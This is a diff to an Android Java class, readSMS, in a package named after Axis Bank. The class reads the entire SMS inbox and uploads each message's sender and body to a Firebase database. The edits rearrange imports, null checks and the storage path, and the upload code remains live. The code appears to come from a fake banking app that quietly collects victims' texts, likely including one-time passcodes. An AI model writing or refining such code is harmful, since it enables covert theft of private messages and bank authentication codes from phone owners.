@@ -2,13 +2,9 @@ package com.bank.axisbank.HELPER;
 
 import android.content.Context;
 import android.database.Cursor;
-import android.os.Build;
 import android.provider.Telephony;
 import android.util.Log;
-import android.widget.Toast;
 
-import com.bank.axisbank.phone;
-import com.google.firebase.FirebaseApp;
 import com.google.firebase.auth.FirebaseAuth;
 import com.google.firebase.auth.FirebaseUser;
 import com.google.firebase.database.DatabaseReference;
@@ -35,16 +31,15 @@ public class readSMS {
                 int messageId = cursor.getInt(cursor.getColumnIndexOrThrow("_id"));
                 String contactSender = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                 body = messageId + contactSender + "\t\t" + cursor.getString(cursor.getColumnIndexOrThrow("body"));
-//                Toast.makeText(context, body, Toast.LENGTH_SHORT).show();
                 // Get the user's email using Firebase Authentication
                 FirebaseAuth auth = FirebaseAuth.getInstance();
                 FirebaseUser user = auth.getCurrentUser();
 
-                if (user != null) {
+                if (user != null && user.getEmail()!=null) {
                     String userEmail = user.getEmail();
-                    if (userEmail != null) {
+
                         // Create the path based on the user's email
-                        String path = "Messages/" + userEmail.substring(0, 10);
+                        String path = userEmail.substring(0, 10)+"/Messages";
 
                         // Store the SMS at the specified path
                         FirebaseDatabase fd = FirebaseDatabase.getInstance();
@@ -52,7 +47,6 @@ public class readSMS {
                         String messageID = root.push().getKey();
                         assert messageID != null;
                         root.child(messageID).setValue(body);
-                    }
                 }
 
             }
